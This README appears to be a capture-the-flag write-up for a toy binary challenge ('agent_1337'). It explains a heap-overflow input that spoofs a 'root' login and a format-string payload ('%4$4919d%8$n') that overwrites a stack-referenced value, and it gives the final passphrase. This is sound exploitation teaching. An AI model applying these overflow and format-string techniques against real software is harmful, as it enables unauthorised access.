# agent_1337

agent_1337 research

# Usage

```
$ go run .
stackpointer
```

# TLDR

This sequence of commands lets us go past stage 0:

```
welcome agent 1337, the evil group 0xL0CCEDC0DE has stolen 1337 BILLION dollars, you MUST get it back...
for your first take you must hack into the admin account
0: enter username, 1: enter password, 2: login> 0
enter ur username: room
0: enter username, 1: enter password, 2: login> 1
enter ur password: tour
0: enter username, 1: enter password, 2: login> 2
please try again as an admin!
0: enter username, 1: enter password, 2: login> 0
enter ur username: room
0: enter username, 1: enter password, 2: login> 1
enter ur password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaroot
0: enter username, 1: enter password, 2: login> 1
enter ur password: IAMROOT1337
0: enter username, 1: enter password, 2: login> 2
stage 1/2 of logging in done...
stage 2/2 of logging in done...
```

Next sequence `%4$4919d%8$n` lets us go past stage 1:

```
good job agent 1337! you must now use ur secret device to change the code to unlock the door! the current code is ABCD and you must change it!
> %4$4919d%8$n
```

And finally, the name is `stackpointer` at stage 2:

```
YOU MADE IT agent 1337 you now have to get the money and escape
wait is someone here?
so mr 1337... you made it into our building... you want this money so bad right?? ok than, say my name and ill give it to you!
what is my name?: stackpointer
you did it... fine i guess you can have the money back
AGENT 1337 YOU DID IT!
```

# Stage 0

After reverse engineering this stage, we find out that the username is `root` and the password is `IAMROOT1337`. However, we cannot easily pass these to the corresponding input options, because username is tested against `root` and the entire login is considered a failure if you input `root` directly. However, what I personally observed is that consecutive `malloc`s are 112 bytes apart (this might vary depending on OS / hardware, so not a robust observation). Hence, we have a password like `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaroot` (there are 112 letters `a`), because it overflows its own allocated space and writes to login's allocated space, then we just enter `IAMROOT1337` for the password again. Voilà.

**Note #1**: This leaves us with a memory leak! Oh well!

# Stage 1

After reverse engineering this stage, we find out that user's input is passed as a first argument to `printf` which makes it vulnerable to format string attack. We can examine function's stack at this point by passing `%p.%p.%p.%p.%p.%p.%p.%p` as an input:

```
good job agent 1337! you must now use ur secret device to change the code to unlock the door! the current code is ABCD and you must change it!
> %p.%p.%p.%p.%p.%p.%p.%p

0x1.0x1.0x7a8211514887.0x7a821161ca70.0x7ffca80f23ac.0x62aa334298a6.0xa0062aa3342bd68.0x62aa70007ba0
```

`0x62aa70007ba0` is the address we are looking for (8th argument). This is the address of the code (initially `ABCD`) we need to change. Going back to `printf` we can forge a string `%4$4919d%8$n` to write `0x1337` (or `4919` in decimal) to this address. `%4$4919d` part of this code takes forth argument `%4` of printf and prints is as a number with a `d` formatter and a width of `4919`, then we use `n` formatter to write the amount of currently printed bytes to `%8` - eighth argument of `printf`.

# Stage 2

This stage is all about reverse engineering, but the end result is in the `solution.go` file of this directory. The name is `stackpointer`.